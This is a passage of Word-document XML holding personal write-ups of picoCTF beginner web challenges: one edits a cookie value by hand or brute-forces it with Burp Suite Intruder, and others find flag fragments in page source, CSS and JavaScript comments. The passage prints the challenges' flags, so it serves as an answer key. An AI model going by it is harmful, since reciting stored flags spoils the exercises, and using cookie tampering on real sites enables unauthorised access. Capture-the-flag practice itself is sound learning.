          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>torage</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">irefox </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DEBB63" w14:textId="34D517EB"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A588584" wp14:editId="161AA3C2">
            <wp:extent cx="6332220" cy="29019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33C78E6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AE92D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43BC90"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显示</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>为</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>-1</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>，我们修改为正值，得到如下页面：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A5A939" w14:textId="7A97C9A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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C1F66CE" wp14:editId="2A44C425">
            <wp:extent cx="6332220" cy="12674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stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1267460"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C59991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452053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499E8889" w14:textId="289A9079" w:rsid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r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>一直试到了</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>，刷新页面得到</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5377A2A7" w14:textId="77777777" w:rsidR="00974072" w:rsidRPr="004A6D37" w:rsidRDefault="00974072" w:rsidP="00974072">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A6D37">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Modify Value to 18, press enter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA5394A" w14:textId="0E056BAA" w:rsidR="00974072" w:rsidRPr="00974072" w:rsidRDefault="00974072" w:rsidP="00974072">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A6D37">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Then refresh the page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E8D825" w14:textId="637BDCB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21CEA070" wp14:editId="650FC236">
            <wp:extent cx="6332220" cy="2289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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2289810"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB8DE4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5FE1E0A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773DE4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二、</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>burpsuit</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>拦截</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3323167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420E65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我拦截的是这个页面，原页面也可以</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D32342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A08C3F7" w14:textId="29D3FC5A" w:rsidR="00974072" w:rsidRPr="00974072" w:rsidRDefault="004A6D37" w:rsidP="00974072">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:noProof/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E774CAB" wp14:editId="70A94BF5">
            <wp:extent cx="6334125"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4125" cy="2524125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D52D33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7DC1D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C814AD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721D54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p>
    <w:p w14:paraId="7FBEA62C" w14:textId="30E0D343" w:rsidR="00974072" w:rsidRDefault="00974072" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DEFD491" w14:textId="6C83AE5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739F86F6" w14:textId="0116FF8E"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Send to intruder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6995A4B8"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1C9E6911" w14:textId="7C052F2D"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6DEFD718" wp14:editId="4DE7BCE5">
            <wp:extent cx="6332220" cy="197675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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1976755"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="78986DB0"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43EDB370" w14:textId="25ABD00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B579FB6" wp14:editId="7B96F1CA">
            <wp:extent cx="6256562" cy="4221846"/>
            <wp:effectExtent l="0" t="0" r="0" b="762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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6256562" cy="4221846"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="238F57C5" w14:textId="08784621" w:rsidR="0096174C" w:rsidRDefault="003F18E9" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="4DF9EFFB">
          <v:rect id="Ink 39" o:spid="_x0000_s1033" style="position:absolute;margin-left:217.4pt;margin-top:303.5pt;width:194.5pt;height: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564,632" filled="f" strokecolor="#fffc00" strokeweight="6mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" aspectratio="t" verticies="t" text="t" shapetype="t"/>
            <o:ink i="AHMdA4gFdAEQWM9UiuaXxU+PBvi60uGbIgMTSBRE//kDRawCRwFG2ARXCQAAAAUCC2QZGDIKgcf/&#10;/w+Ax///DzMKgcf//w+Ax///DwonCYd4bvvDbzbJXC9CZe4L0IcnGao7Oc0cCnGgCgARIADmTqzp&#10;udgB&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00974072">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C40D8A2" wp14:editId="6F5357F8">
            <wp:extent cx="6332220" cy="451612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54"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="4516120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A60EF6E" w14:textId="30539C1A" w:rsidR="004A6D37" w:rsidRDefault="004A6D37" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12986957" w14:textId="7C0DE48D" w:rsidR="004A6D37" w:rsidRDefault="004A6D37" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C05ED09" w14:textId="6B72E4D1" w:rsidR="004A6D37" w:rsidRPr="004A6D37" w:rsidRDefault="004A6D37" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r w:rsidRPr="004A6D37">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>The response length of 18 is quite different with other response</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE7DE9A" w14:textId="52F1EB36" w:rsidR="004A6D37" w:rsidRDefault="004A6D37" w:rsidP="004A6D37">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得到</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>flag</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D962E4" w14:textId="1FB38A5D" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45CFDAD7" w14:textId="520B47C4" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15CD05FE" w14:textId="756BA84D" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E2499AB" w14:textId="1D280D2A" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="248DC825" w14:textId="6E43FCA5" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4140318A" w14:textId="77777777" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="557BD11A" w14:textId="77777777" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="00582B9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Insp3ct0r</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A11C2C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6669976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Tags: picoCTF 2019Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE1CE63" w14:textId="77777777" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="00582B9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20B79DDC" w14:textId="77777777" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="00582B9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F2FB7FF" w14:textId="61B5119B" w:rsidR="00582B93" w:rsidRDefault="00582B93"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Kishor Balan tipped us off that the following code may need inspection: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/41511/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId55"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56" w:history="1">
        <w:r w:rsidR="004C0F07" w:rsidRPr="004C12C8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://jupiter.challenges.picoctf.org:41511</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A244DC4" w14:textId="75928847"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p>
    <w:p w14:paraId="11830A20" w14:textId="027D3234"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Inspector HTML  || </w:t>
      </w:r>
      <w:bookmarkStart w:id="43" w:name="_Hlk112454920"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>view page source</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
    <w:p w14:paraId="17FBB6E8" w14:textId="7B377A78"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sidRPr="004C0F07">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>&lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F8FD4D" w14:textId="1B1F89C5" w:rsidR="00582B93" w:rsidRPr="00974072" w:rsidRDefault="004C0F07" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{}Style Editor -&gt; mycss.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEBAE7D" w14:textId="661DEEDD" w:rsidR="004C0F07" w:rsidRDefault="004C0F07" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A50FF2E" w14:textId="77777777" w:rsidR="004C0F07" w:rsidRDefault="004C0F07" w:rsidP="004C0F0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Debugger -&gt;myjs.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25618C52" w14:textId="77777777" w:rsidR="004C0F07" w:rsidRPr="004C0F07" w:rsidRDefault="004C0F07" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5425F2FE" w14:textId="00E59E00" w:rsidR="004A6D37" w:rsidRDefault="004C0F07" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">/* Javascript sure is neat. Anyways part 3/3 of the flag: </w:t>
      </w:r>
      <w:bookmarkStart w:id="44" w:name="_Hlk112454695"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>_lucky?832b0699</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>} */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DA1F3A" w14:textId="0F04A697" w:rsidR="004C0F07" w:rsidRDefault="004C0F07" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?832b0699}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4077B0CB" w14:textId="4AC62F97" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="301C9783" w14:textId="53ED4665" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79EA4A97"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Inspect HTML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3C8190"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8432AC9"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Exploitationinspector</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33CD20B6"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6CA8BA"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691D3C4" w14:textId="033B80E3"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get the flag?Go to this </w:t>
      </w:r>
      <w:hyperlink r:id="rId57"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1CCC4009" w14:textId="062D8466"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view page source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EFD294B" w14:textId="049FFD69" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="00CD17CC">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:bookmarkStart w:id="45" w:name="_Hlk112454946"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF{1n5p3t0r_0f_h7ml_8113f7e2}</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>--&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B2674F" w14:textId="47C91928" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
